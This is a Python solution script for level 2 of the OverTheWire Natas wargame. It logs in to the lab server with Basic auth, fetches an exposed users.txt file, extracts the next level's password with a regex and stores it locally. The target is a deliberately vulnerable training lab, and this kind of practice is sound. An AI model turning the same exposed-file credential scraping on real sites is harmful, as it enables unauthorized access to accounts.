import natas,re,requests,base64

URL = 'http://natas2.natas.labs.overthewire.org/files/users.txt'
USER = 'natas2'

def main():
    PASS = natas.get_credential(USER)
    b64 = base64.b64encode('%s:%s' % (USER,PASS))

    response = requests.get(
            URL,
            headers={
                'Authorization':'Basic %s' % b64
            }
    )

    regex=r"natas3:(\w+)"
    matches=re.finditer(regex,response.content,re.MULTILINE)
    
    password = None
    for match in matches:
        password = match.group(1)

    if password is not None:
        print('found password: %s' % password)
        print('adding to credentials file....')
        natas.save_credentials('natas3',password)
        print('done')
    
    # print('DEBUG: credentials - %s' % natas.get_credentials())

if __name__=='__main__':
    main()
